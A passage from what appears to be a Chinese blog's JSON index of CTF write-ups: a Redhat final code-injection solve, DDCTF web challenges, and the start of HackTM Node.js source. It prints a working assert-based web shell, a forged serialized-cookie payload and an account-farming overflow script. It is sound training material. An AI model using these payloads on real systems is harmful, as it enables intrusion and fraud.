&#x8FDB;&#x6765;&#x540E;&#x53F0;&#x53EF;&#x4EE5;&#x67E5;&#x5230;&#x6700;&#x8FD1;&#x6587;&#x4EF6;&#x7684;&#x4FEE;&#x6539;&#x8BB0;&#x5F55;&#xFF0C;&#x76F4;&#x63A5;&#x770B;&#x5230;&#x4E86;edit_languages.php&#x5728;&#x6700;&#x8FD1;&#x6709;&#x4FEE;&#x6539;&#x8FC7;&#xFF0C;&#x4E8E;&#x662F;&#x76F4;&#x63A5;&#x5C31;&#x53BB;&#x5BA1;&#x5B83;&#x4E86;&#x3002; &#x6F0F;&#x6D1E;&#x70B9;&#xFF1A;\\admin\\edit_languages.php 1234567891011121314151617181920212223242526272829elseif ($_REQUEST[&apos;act&apos;] == &apos;edit&apos;){ /* &#x8BED;&#x8A00;&#x9879;&#x7684;&#x8DEF;&#x5F84; */ $lang_file = isset($_POST[&apos;file_path&apos;]) ? trim($_POST[&apos;file_path&apos;]) : &apos;&apos;; /* &#x66FF;&#x6362;&#x524D;&#x7684;&#x8BED;&#x8A00;&#x9879; */ $src_items = !empty($_POST[&apos;item&apos;]) ? stripslashes_deep($_POST[&apos;item&apos;]) : &apos;&apos;; /* &#x4FEE;&#x6539;&#x8FC7;&#x540E;&#x7684;&#x8BED;&#x8A00;&#x9879; */ $dst_items = array(); $_POST[&apos;item_id&apos;] = stripslashes_deep($_POST[&apos;item_id&apos;]); for ($i = 0; $i &lt; count($_POST[&apos;item_id&apos;]); $i++) { /* &#x8BED;&#x8A00;&#x9879;&#x5185;&#x5BB9;&#x5982;&#x679C;&#x4E3A;&#x7A7A;&#xFF0C;&#x4E0D;&#x4FEE;&#x6539; */ if (trim($_POST[&apos;item_content&apos;][$i]) == &apos;&apos;) { unset($src_items[$i]); } else { $_POST[&apos;item_content&apos;][$i] = str_replace(&apos;\\\\\\\\n&apos;, &apos;\\\\n&apos;, $_POST[&apos;item_content&apos;][$i]); $dst_items[$i] = $_POST[&apos;item_id&apos;][$i] .&apos; = &apos;. &apos;&quot;&apos; .$_POST[&apos;item_content&apos;][$i]. &apos;&quot;;&apos;;// $dst_items[$i] = $_POST[&apos;item_id&apos;][$i] .&apos; = &apos;. &apos;\\&apos;&apos; .$_POST[&apos;item_content&apos;][$i]. &apos;\\&apos;;&apos;; } } /* &#x8C03;&#x7528;&#x51FD;&#x6570;&#x7F16;&#x8F91;&#x8BED;&#x8A00;&#x9879; */ $result = set_language_items($lang_file, $src_items, $dst_items); &#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4ECE;post&#x4E2D;&#x83B7;&#x53D6;&#x5230;&#x7684;file_path&#x548C;item&#x4F20;&#x5165;&#x5230;&#x4E86;set_language_items&#x3002; &#x8DDF;&#x8E2A;&#x8FC7;&#x53BB;&#xFF1A; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849function set_language_items($file_path, $src_items, $dst_items){ /* &#x68C0;&#x67E5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x53EF;&#x5199;&#xFF08;&#x4FEE;&#x6539;&#xFF09; */ if (file_mode_info($file_path) &lt; 2) { return false; } /* &#x83B7;&#x53D6;&#x6587;&#x4EF6;&#x5185;&#x5BB9; */ $line_array = file($file_path); if (!$line_array) { return false; } else { $file_content = implode(&apos;&apos;, $line_array); } $snum = count($src_items); $dnum = count($dst_items); if ($snum != $dnum) { return false; } /* &#x5BF9;&#x7D22;&#x5F15;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#xFF0C;&#x9632;&#x6B62;&#x9519;&#x4F4D;&#x66FF;&#x6362; */ ksort($src_items); ksort($dst_items); for ($i = 0; $i &lt; $snum; $i++) { $file_content = str_replace($src_items[$i], $dst_items[$i], $file_content); } /* &#x5199;&#x5165;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x8BED;&#x8A00;&#x9879; */ $f = fopen($file_path, &apos;wb&apos;); if (!$f) { return false; } if (!fwrite($f, $file_content)) { return false; } else { return true; }} &#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5E76;&#x672A;&#x5BF9;&#x5199;&#x5165;&#x7684;&#x5185;&#x5BB9;&#x505A;&#x4E25;&#x683C;&#x7684;&#x8FC7;&#x6EE4;&#x3002; &#x62FF;flag&#x7684;&#x6B65;&#x9AA4;&#xFF1A; &#x8FDB;&#x5165;&#x5230;&#x6A21;&#x677F;&#x7BA1;&#x7406; =&gt; &#x8BED;&#x8A00;&#x9879;&#x7F16;&#x8F91; =&gt; &#x9009;&#x62E9;user.php =&gt; &#x641C;&#x7D22; &#x7528;&#x6237;&#x4FE1;&#x606F; &#x5C06;&#x5185;&#x5BB9;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x5904;&#x4FEE;&#x6539;&#x4E3A;&#xFF1A;${${assert($_POST[cmd])}} &#x5F53;&#x65F6;&#x8681;&#x5251;&#x8FDE;&#x63A5;user.php&#x6CA1;&#x6709;&#x6210;&#x529F;&#x3002;&#x4F7F;&#x7528;&#x4E86;&#x53E6;&#x5916;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&#xFF1A; POST&#x6570;&#x636E;&#xFF1A;cmd=hightlight_file($_GET[a])&#xFF0C;&#x4F20;&#x5165;&#x4E00;&#x4E2A;a=/flag&#x8BFB;&#x53D6;&#x5230;&#x7684;flag&#x3002;","link":"/2019/12/18/2019 Redhat决赛 Writeup/"},{"title":"DDCTF 部分题目 Writeup","text":"&#x8FD9;&#x6B21;DDCTF&#x771F;&#x7684;&#x662F;&#x5B66;&#x5230;&#x5F88;&#x591A;&#x4E1C;&#x897F;&#xFF0C;&#x5E0C;&#x671B;&#x540E;&#x9762;&#x53EF;&#x4EE5;&#x591A;&#x591A;&#x53C2;&#x52A0;&#x6BD4;&#x8D5B;&#x953B;&#x70BC;&#x81EA;&#x5DF1;&#x3002; Web - &#x6EF4;~&#x5730;&#x5740;&#xFF1A;http://117.51.150.246/ BASE64&#x89E3;&#x7801;&#x4E24;&#x6B21;jpg&#x53C2;&#x6570;&#x7684;&#x503C;&#xFF1A;666C61672E6A7067 &#x518D;&#x7ECF;&#x8FC7;&#x4E00;&#x6B21;16&#x8FDB;&#x5236;&#x8F6C;&#x5B57;&#x7B26;&#x4E32;&#xFF1A;flag.jpg &#x53EF;&#x77E5;&#x9875;&#x9762;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x7684;&#x540D;&#x79F0;&#x662F;&#x5148;&#x7ECF;&#x8FC7;&#x4E24;&#x6B21;BASE64&#x89E3;&#x7801;&#x518D;&#x7ECF;&#x8FC7;&#x4E00;&#x6B21;&#x8FDB;&#x5236;&#x8F6C;&#x6362;&#x5F97;&#x5230;&#x7684;&#x3002; &#x5C1D;&#x8BD5;&#x8BFB;&#x53D6;index.php: http://117.51.150.246/index.php?jpg=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3 &#x9875;&#x9762;&#x8FD4;&#x56DE;&#x5F97;&#x5230;data&#x534F;&#x8BAE;&#x91CC;&#x7684;&#x7ECF;&#x8FC7;BASE64&#x5904;&#x7406;&#x540E;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x89E3;&#x7801;&#x540E;&#x5F97;&#x5230;&#x6E90;&#x7801;&#xFF1A; 1234567891011121314151617181920212223242526&lt;?php/* * https://blog.csdn.net/FengBanLiuYun/article/details/80616607 * Date: July 4,2018 */error_reporting(E_ALL || ~E_NOTICE);header(&apos;content-type:text/html;charset=utf-8&apos;);if(! isset($_GET[&apos;jpg&apos;])) header(&apos;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&apos;);$file = hex2bin(base64_decode(base64_decode($_GET[&apos;jpg&apos;])));echo &apos;&lt;title&gt;&apos;.$_GET[&apos;jpg&apos;].&apos;&lt;/title&gt;&apos;;$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);echo $file.&apos;&lt;/br&gt;&apos;;$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);echo $file.&apos;&lt;/br&gt;&apos;;$txt = base64_encode(file_get_contents($file));echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot;.$txt.&quot;&apos;&gt;&lt;/img&gt;&quot;;/* * Can you find the flag file? * */?&gt; &#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;$file&#x7ECF;&#x8FC7;&#x7684;&#x5904;&#x7406;&#x6B65;&#x9AA4;&#x4E3A;&#xFF1A; jpg&#x53C2;&#x6570;&#x7684;&#x503C;&#x7ECF;&#x8FC7;&#x4E24;&#x6B21;base64&#x52A0;&#x5BC6;&#xFF0C;&#x4E00;&#x6B21;&#x8FDB;&#x5236;&#x8F6C;&#x6362;&#x3002; &#x4F7F;&#x7528;preg_replace()&#x51FD;&#x6570;&#x5C06;&#x9664;&#x4E86;&#x5B57;&#x6BCD;&#x6570;&#x5B57;&#x5916;&#x7684;&#x5B57;&#x7B26;&#x5220;&#x9664; &#x5C06;&#x53D8;&#x91CF;&#x4E2D;config&#x66FF;&#x6362;&#x4E3A;! &#x9898;&#x76EE;&#x4E2D;&#x8FD8;&#x7ED9;&#x4E86;&#x63D0;&#x793A;https://blog.csdn.net/FengBanLiuYun/article/details/80616607 &#x770B;&#x4E86;&#x4E4B;&#x540E;&#x6211;&#x4E00;&#x76F4;&#x4EE5;&#x4E3A;&#x662F;&#x8981;&#x7ED5;&#x8FC7;preg_replace()&#x63D0;&#x4EA4;&#x4E00;&#x4E2A;\\b&#x6765;&#x6784;&#x9020;&#x53C2;&#x6570;&#x503C;&#x6765;&#x8BFB;&#x53D6;config.php&#xFF0C;&#x65E0;&#x679C;&#x3002; &#x540E;&#x6765;&#x7ECF;&#x8FC7;&#x522B;&#x4EBA;&#x63D0;&#x793A;&#x624D;&#x77E5;&#x9053;&#xFF0C;&#x535A;&#x5BA2;&#x7684;&#x535A;&#x4E3B;&#x7684;&#x53E6;&#x5916;&#x4E00;&#x7BC7;&#x5E16;&#x5B50;&#x63D0;&#x5230;&#x7684;vim &#x5F02;&#x5E38;&#x9000;&#x51FA; swp&#x6587;&#x4EF6;&#x63D0;&#x793A; &#x8BFB;&#x53D6;practice.txt.swp: http://117.51.150.246/index.php?jpg=TnpBM01qWXhOak0zTkRZNU5qTTJOVEpsTnpRM09EYzBNbVUzTXpjM056QT0= &#x83B7;&#x5F97;&#x4E86;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x540D;&#xFF1A;f1ag!ddctf.php &#x8BBF;&#x95EE;&#x540E;&#x53D1;&#x73B0;&#x6CA1;&#x6709;&#x4E1C;&#x897F;&#xFF0C;&#x76F4;&#x63A5;&#x8BFB;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x6E90;&#x7801;&#xFF1A; emmm,&#x53D1;&#x73B0;f1ag!ddctf.php&#x88AB;&#x8FC7;&#x6EE4;&#x6210;f1agddctf.php&#xFF0C;&#x56E0;&#x4E3A;str_replace()&#x4F1A;&#x628A;config&#x66FF;&#x6362;&#x4E3A;!&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x76F4;&#x63A5;&#x628A;&#x8BFB;&#x53D6;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x8BBE;&#x4E3A;f1agconfigddctf.php&#xFF0C;&#x6210;&#x529F;&#x8BFB;&#x53D6;&#x5230;&#x6E90;&#x7801;&#xFF1A; http://117.51.150.246/index.php?jpg=TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ== 123456789101112131415161718&lt;?phpinclude(&apos;config.php&apos;);$k = &apos;hello&apos;;extract($_GET);if(isset($uid)){ $content=trim(file_get_contents($k)); if($uid==$content) { echo $flag; } else { echo&apos;hello&apos;; }}?&gt; &#x53D8;&#x91CF;&#x8986;&#x76D6;&#xFF0C;&#x5224;&#x65AD;&#x53D8;&#x91CF;uid&#x548C;&#x6587;&#x4EF6;&#x540D;&#x4E3A;&#x53D8;&#x91CF;k&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x662F;&#x5426;&#x76F8;&#x540C;&#x3002; &#x4E00;&#x5F00;&#x59CB;&#x60F3;&#x7740;&#x5E94;&#x8BE5;&#x662F;&#x5F31;&#x7C7B;&#x578B;&#xFF0C;&#x4F46;&#x540E;&#x6765;&#x53D1;&#x73B0;&#x4E0D;&#x662F;&#x3002; &#x5982;&#x679C;&#x6587;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x8BDD;&#xFF0C;&#x8BFB;&#x53D6;&#x5230;&#x7684;&#x5185;&#x5BB9;&#x5C31;&#x4E3A;&#x7A7A;&#xFF0C;&#x6240;&#x4EE5;uid&#x8D4B;&#x503C;&#x4E3A;&#x7A7A;&#xFF0C;k&#x4E3A;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x8BBF;&#x95EE;&#xFF1A; http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=333 &#x5F97;&#x5230;Flag&#x3002; (&#x56E0;&#x4E3A;&#x7F51;&#x7AD9;&#x5B58;&#x5728;robots.txt&#xFF0C;&#x5185;&#x5BB9;&#x4E3A;excuse me?&#xFF0C; &#x6211;&#x5C1D;&#x8BD5;&#x8BBF;&#x95EE;&#xFF1A;http://117.51.150.246/f1ag!ddctf.php?uid=excuse%20me?&amp;k=robots.txt &#x4E0D;&#x77E5;&#x9053;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x6210;&#x529F;) Web - WEB&#x7B7E;&#x5230;&#x9898;&#x9898;&#x76EE;&#x5730;&#x5740;&#xFF1A;http://117.51.158.44/ &#x7F51;&#x9875;&#x63D0;&#x793A;&#xFF1A;&#x62B1;&#x6B49;&#xFF0C;&#x60A8;&#x6CA1;&#x6709;&#x767B;&#x9646;&#x6743;&#x9650;&#xFF0C;&#x8BF7;&#x83B7;&#x53D6;&#x6743;&#x9650;&#x540E;&#x8BBF;&#x95EE;----- &#x53D1;&#x73B0;&#xFF0C;&#x5F39;&#x51FA;&#x9700;&#x8981;&#x6388;&#x6743;&#xFF0C;&#x4ED6;&#x63D0;&#x793A;&#x8BE5;&#x7F51;&#x7AD9;&#x79F0;&#xFF1A;restricted username &#x5C1D;&#x8BD5;&#x4E86;&#x51E0;&#x4E2A;&#x5F31;&#x53E3;&#x4EE4;&#xFF0C;&#x4E0D;&#x884C;&#x3002; &#x5728;index.php&#x9875;&#x9762;&#x7684;&#x6E90;&#x7801;&#x4E2D;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;js&#xFF1A;http://117.51.158.44/js/index.js 1234567891011121314151617181920212223242526/** * Created by PhpStorm. * User: didi * Date: 2019/1/13 * Time: 9:05 PM */function auth() { $.ajax({ type: &quot;post&quot;, url:&quot;http://117.51.158.44/app/Auth.php&quot;, contentType: &quot;application/json;charset=utf-8&quot;, dataType: &quot;json&quot;, beforeSend: function (XMLHttpRequest) { XMLHttpRequest.setRequestHeader(&quot;didictf_username&quot;, &quot;&quot;); }, success: function (getdata) { console.log(getdata); if(getdata.data !== &apos;&apos;) { document.getElementById(&apos;auth&apos;).innerHTML = getdata.data; } },error:function(error){ console.log(error); } });} &#x7ED9;http://117.51.158.44/app/Auth.php&#x53D1;&#x4E86;&#x4E00;&#x4E2A;POST&#x8BF7;&#x6C42;&#xFF0C;&#x5E76;&#x4E14;http&#x5934;&#x5305;&#x542B;didictf_username &#x7528;Brupsuite&#x5305;&#x542B;Didictf_Username: admin&#x50CF;Auth.php&#x63D0;&#x4EA4;&#x4E00;&#x4E2A;POST&#x8BF7;&#x6C42;,&#x8FD4;&#x56DE;&#xFF1A; {errMsg:success,data:&#x60A8;&#x5F53;&#x524D;&#x5F53;&#x524D;&#x6743;&#x9650;&#x4E3A;&#x7BA1;&#x7406;&#x5458;----&#x8BF7;&#x8BBF;&#x95EE;:app/fL2XID2i0Cdh.php} &#x8BBF;&#x95EE;http://117.51.158.44/app/fL2XID2i0Cdh.php&#x5F97;&#x5230;&#x4E24;&#x4EFD;PHP&#x4EE3;&#x7801;&#xFF0C;&#x770B;&#x6765;&#x662F;&#x53C8;&#x8981;&#x5BA1;&#x8BA1;&#xFF1F; &#x5C06;&#x6E90;&#x7801;&#x7406;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x4E4B;&#x540E;&#x641C;&#x7D22;&#x5230;&#x4E86;Codeigniter &#x5229;&#x7528;&#x52A0;&#x5BC6;Key&#xFF08;&#x5BC6;&#x94A5;&#xFF09;&#x7684;&#x5BF9;&#x8C61;&#x6CE8;&#x5165;&#x6F0F;&#x6D1E; &#x8BFB;&#x5B8C;&#x6587;&#x7AE0;&#x4E4B;&#x540E;&#x7684;&#x601D;&#x8DEF;&#x5C31;&#x662F;&#xFF1A; &#x62FF;&#x5230;eancrykey &#x901A;&#x8FC7;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4FEE;&#x6539;$this-&gt;path &#x8BFB;&#x53D6;flag &#x6E90;&#x7801;&#x4E2D;&#x53EF;&#x4EE5;&#x770B;&#x5230;eancrykey&#x662F;&#x901A;&#x8FC7;&#x8BFB;&#x53D6;../config/key.txt&#x5F97;&#x5230;&#x7684;&#xFF0C;&#x540E;&#x9762;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#xFF1A; 12345678if(!empty($_POST[&quot;nickname&quot;])) { $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey); $data = &quot;Welcome my friend %s&quot;; foreach ($arr as $k =&gt; $v) { $data = sprintf($data,$v); } parent::response($data,&quot;Welcome&quot;);} &#x8FD9;&#x91CC;&#x4F7F;&#x7528;POST&#x63D0;&#x4EA4;nickname=123 %s.(&#x9700;&#x8981;&#x5C06;&#x6DFB;&#x52A0;cookie&#x503C;) &#x56E0;&#x4E3A;&#x8FD9;&#x91CC;$data&#x53D8;&#x91CF;&#x7ECF;&#x8FC7;&#x4E86;&#x4E24;&#x6B21;sprintf&#x5904;&#x7406;&#xFF0C;&#x53EA;&#x6709;&#x5728;&#x503C;&#x91CC;&#x9762;&#x6DFB;&#x52A0;s%&#xFF0C;&#x624D;&#x80FD;&#x628A;eancrykey&#x8BFB;&#x51FA;&#x6765;&#x3002; eancrykey&#x7684;&#x503C;&#x4E3A;&#xFF1A;EzblrbNS, &#x5F53;&#x65F6;&#x7684;&#x622A;&#x56FE;&#xFF1A; &#x6839;&#x636E;&#x6587;&#x7AE0;&#x91CC;&#x9762;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x6784;&#x9020;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;payload&#xFF0C;&#x6E90;&#x7801;&#x4E3A;&#xFF1A; 12345678910111213&lt;?phpclass Application { public function __construct() { $this-&gt;path = &quot;....//config/flag.txt&quot;; }}$session = serialize(new Application);echo $session;$private_key = &apos;EzblrbNS&apos;;echo md5($private_key.$session);?&gt; &#x751F;&#x6210;&#x7684;payload&#x4E3A;&#xFF1A;O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;....//config/flag.txt&quot;;}77cd55a8d29df4f005f85e536d876525 (&#x8BB0;&#x5F97;&#x5C06;payload url&#x7F16;&#x7801;) flag&#x7684;&#x5730;&#x5740;&#x662F;&#x56E0;&#x4E3A;&#x6E90;&#x7801;&#x4E2D;&#x7684;&#x63D0;&#x793A;&#xFF1A;eancrykey and flag under the folder, &#x53C8;&#x56E0;&#x4E3A;$path&#x4F1A;&#x7ECF;&#x8FC7;&#x5904;&#x7406;&#xFF0C;&#x4F1A;&#x5C06;&#x201D;../&#x201C;&#x5220;&#x9664;&#xFF0C;&#x6240;&#x4EE5;&#x53CC;&#x5199;&#x201D;../&#x201C;&#x3002;&#x6700;&#x540E;&#x53D1;&#x73B0;path&#x7684;&#x957F;&#x5EA6;&#x521A;&#x521A;18&#x3002; &#x5C06;cookie&#x503C;&#x6539;&#x4E3A;payload&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8BFB;&#x53D6;&#x5230;flag&#x3002; Web - Upload-IMG&#x8FD9;&#x91CC;&#x8003;&#x4E86;&#x4E00;&#x4E2A;&#x6CA1;&#x6709;&#x63A5;&#x89E6;&#x8FC7;&#x7684;&#x70B9;&#xFF0C;&#x4E8C;&#x6B21;&#x6E32;&#x67D3;&#x3002; &#x8FD9;&#x91CC;&#x4E0A;&#x4F20;&#x7684;&#x662F;&#x4E00;&#x4E2A;JPG&#x6587;&#x4EF6;&#xFF0C;&#x5148;&#x628A;jpg&#x4E0A;&#x4F20;&#x7136;&#x540E;&#x4FDD;&#x5B58;&#x4E0B;&#x6765;&#x3002; &#x4F7F;&#x7528;&#x811A;&#x672C;&#x76F4;&#x63A5;&#x8DD1;&#x4E00;&#x4E0B;JPG&#x56FE;&#x7247;&#xFF0C;&#x518D;&#x6B21;&#x4E0A;&#x4F20;&#x5F97;&#x5230;Flag&#x3002; &#x811A;&#x672C;&#x6765;&#x81EA;&#xFF1A;https://paper.tuisec.win/detail/39553671bf72998 &#x751F;&#x6210;payload_jpg: &#x5F97;&#x5230;Flag&#xFF1A; Web - &#x590D;&#x73B0; - &#x5927;&#x5409;&#x5927;&#x5229;,&#x4ECA;&#x665A;&#x5403;&#x9E21;~&#x9898;&#x76EE;&#x63D0;&#x793A;&#xFF1A;&#x6CE8;&#x518C;&#x7528;&#x6237;&#x767B;&#x9646;&#x7CFB;&#x7EDF;&#x5E76;&#x8D2D;&#x4E70;&#x5165;&#x573A;&#x7968;&#x636E;,&#x6DD8;&#x6C70;&#x6240;&#x6709;&#x5BF9;&#x624B;&#x5C31;&#x80FD;&#x5403;&#x9E21;&#x5566;~ &#x53D1;&#x73B0;&#x53EA;&#x6709;100&#x5143;&#xFF0C;&#x4F46;&#x4E70;&#x7968;&#x9700;&#x8981;2000&#x5143;&#x3002; &#x6211;&#x5F53;&#x65F6;&#x5C1D;&#x8BD5;&#x8FC7;&#x4FEE;&#x6539;&#x4EF7;&#x94B1;&#xFF0C;&#x6CA1;&#x7ED5;&#x8FC7;&#x53BB;&#xFF0C;&#x770B;&#x4E86;wp&#x4E4B;&#x540E;&#x624D;&#x77E5;&#x9053;&#x662F;&#x7528;&#x6574;&#x6570;&#x6EA2;&#x51FA;&#x6765;&#x7ED5;&#x8FC7;&#x3002; &#x8D2D;&#x4E70;&#x94FE;&#x63A5;&#x4E3A;&#xFF1A;/ctf/api/buy_ticket?ticket_price=2000 &#x5C06;ticket_price&#x4FEE;&#x6539;&#x4E3A;&#xFF1A;4294967297 (&#x5728;32&#x4F4D;&#x7CFB;&#x7EDF;&#x4E0B;&#xFF0C;&#x6240;&#x6709;&#x65E0;&#x7B26;&#x53F7;&#x6574;&#x6570;&#x7684;&#x6570;&#x91CF;&#x662F;2^32=4294967296) &#x63D0;&#x4EA4;&#xFF0C;&#x7136;&#x540E;&#x652F;&#x4ED8;&#xFF0C;&#x8D2D;&#x4E70;&#x6210;&#x529F;&#x5E76;&#x4E14;&#x53EA;&#x82B1;&#x4E86;&#x4E00;&#x5143;&#x94B1;&#x3002; &#x5728;&#x6E38;&#x620F;&#x91CC;&#x9762;&#x63D0;&#x793A;&#xFF1A;&#x901A;&#x8FC7;&#x63D0;&#x4EA4;&#x6B63;&#x786E;id&#x4E0E;ticket&#x6765;&#x79FB;&#x9664;&#x5BF9;&#x624B; &#x8FD9;&#x91CC;&#x9700;&#x8981;&#x5199;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#xFF0C;&#x6279;&#x91CF;&#x6CE8;&#x518C;&#xFF0C;&#x8D2D;&#x4E70;&#x5165;&#x573A;&#x7968;&#xFF0C;&#x83B7;&#x5F97;ID&#x548C;ticket&#x3002;&#x7136;&#x540E;&#x7528;&#x8FD9;&#x4E2A;&#x8D26;&#x6237;&#x6765;&#x79FB;&#x9664;&#x3002; &#x8FD9;&#x91CC;&#x501F;&#x7528;&#x4E00;&#x4E2A;&#x5927;&#x4F6C;&#x7684;&#x811A;&#x672C;&#xFF1A; 123456789101112131415161718192021222324252627282930313233343536import requestsimport jsonimport reimport randomimport timeX = requests.Session()X.get(&quot;http://117.51.147.155:5050/ctf/api/register?name=admintest4&amp;password=admintest&quot;)cnt = 0i = 0while(True): i+=1 # time.sleep(0.1) R = requests.Session() # reg reg_res = R.get(&quot;http://117.51.147.155:5050/ctf/api/register?name=Sndav0{}&amp;password=12345678&quot;.format(i)) # if &quot;200&quot; in reg_res.text: # # print(&quot;Sndav{} is registed pass:12345678&quot;.format(i)); buy_res = R.get(&quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967299&quot;) try: bill_id = json.loads(buy_res.text) bill_id = bill_id[&apos;data&apos;][0][&apos;bill_id&apos;] # print(&quot;billid:&quot;+bill_id); buy2_res = R.get(&quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id={}&quot;.format(bill_id)) # print(json.loads(buy2_res.text)[u&apos;code&apos;]) # get_token token_res = R.get(&quot;http://117.51.147.155:5050/ctf/api/search_ticket&quot;) js = json.loads(token_res.text)[&apos;data&apos;][0] # print(js) id = js[&apos;id&apos;] ticket = js[&apos;ticket&apos;] print(id,ticket) X.get(&quot;http://117.51.147.155:5050/ctf/api/remove_robot?id={}&amp;ticket={}&quot;.format(id,ticket)) print(X.get(&quot;http://117.51.147.155:5050/ctf/api/get_flag&quot;).text) cnt+=1 except: pass &#x76F4;&#x63A5;&#x8DD1;&#xFF0C;&#x8FD4;&#x56DE;&#xFF1A; 12141 c8f034432be513ace9e8452f8af78d89{&quot;code&quot;:200,&quot;data&quot;:[&quot;DDCTF{chiken_dinner_hyMCX[n47Fx)}&quot;],&quot;msg&quot;:&quot;\\u5927\\u5409\\u5927\\u5229\\uff0c\\u4eca\\u665a\\u5403\\u9e21&quot;} &#x8FD9;&#x9898;&#x7684;&#x6536;&#x83B7;&#x5E94;&#x8BE5;&#x662F;&#x4E86;&#x89E3;&#x4E86;&#x6574;&#x6570;&#x6EA2;&#x51FA;&#xFF0C;&#x540E;&#x9762;&#x4E5F;&#x53EF;&#x4EE5;&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#x3002;","link":"/2019/04/19/DDCTF 部分Writeup/"},{"title":"Hacktm中一道Node.js题分析(Draw with us)","text":"&#x8BF4;&#x5728;&#x524D;&#x9762;&#x8BF7;&#x6559;Hpdoger&#x5E08;&#x5085;Node.js&#x7684;&#x95EE;&#x9898;&#x65F6;&#xFF0C;&#x4ED6;&#x7ED9;&#x4E86;&#x6211;&#x4E00;&#x9053;HackTM CTF 2020&#x7684;Node.js&#x9898;&#x3002;&#x82B1;&#x4E86;&#x51E0;&#x4E2A;&#x5C0F;&#x65F6;&#x770B;&#x4E5F;&#x6CA1;&#x6709;&#x5F88;&#x597D;&#x7684;&#x89E3;&#x51B3;&#x3002;&#x6700;&#x540E;&#x8FD8;&#x662F;&#x4ED6;&#x7ED9;&#x4E86;&#x601D;&#x8DEF;&#x624D;&#x628A;&#x60F3;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x7406;&#x6E05;&#x695A;&#x3002;&#x7531;&#x4E8E;&#x624D;&#x521A;&#x521A;&#x5B66;&#x4E60;node.js&#xFF0C;&#x6587;&#x7AE0;&#x4E2D;&#x5982;&#x679C;&#x51FA;&#x73B0;&#x95EE;&#x9898;&#x8FD8;&#x5E0C;&#x671B;&#x5E08;&#x5085;&#x4EEC;&#x6307;&#x51FA;&#x6765;&#xFF0C;&#x5341;&#x5206;&#x611F;&#x8C22;&#x3002; &#x89E3;&#x9898;&#x601D;&#x8DEF;&#x9898;&#x76EE;&#x754C;&#x9762;&#xFF1A; &#x9898;&#x76EE;&#x90E8;&#x5206;&#x6E90;&#x7801;&#xFF1A; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246const express = require(&quot;express&quot;);const cors = require(&quot;cors&quot;);const app = express();const uuidv4 = require(&quot;uuid/v4&quot;);const md5 = require(&quot;md5&quot;);const jwt = require(&quot;express-jwt&quot;);const jsonwebtoken = require(&quot;jsonwebtoken&quot;);const server = require(&quot;http&quot;).createServer(app);const io = require(&quot;socket.io&quot;)(server);const bigInt = require(&quot;big-integer&quot;);const { flag, p, n, _clearPIN, jwtSecret } = require(&quot;./flag&quot;);const config = { port: process.env.PORT || 8081, width: 120, height: 80, usersOnline: 0, message: &quot;Hello there!&quot;, p: p, n: n, adminUsername: &quot;hacktm&quot;, whitelist: [&quot;/&quot;, &quot;/login&quot;, &quot;/init&quot;], backgroundColor: 0x888888, version: Number.MIN_VALUE};io.sockets.on(&quot;connection&quot;, function(socket) { config.usersOnline++; socket.on(&quot;disconnect&quot;, function() { config.usersOnline--; });});let users = { 0: { username: config.adminUsername, rights: Object.keys(config) }};let board = new Array(config.height) .fill(0) .map(() =&gt; new Array(config.width).fill(config.backgroundColor));let boardString = boardToStrings();app.use(express.json());app.use(cors());app.use( jwt({ secret: jwtSecret }).unless({ path: config.whitelist }));app.use(function(error, req, res, next) { if (error.name === &quot;UnauthorizedError&quot;) { res.json(err(&quot;Invalid token or not logged in.&quot;)); }});function sign(o) { return jsonwebtoken.sign(o, jwtSecret);}function isAdmin(u) { return u.username.toLowerCase() == config.adminUsername.toLowerCase();}function ok(data = {}) 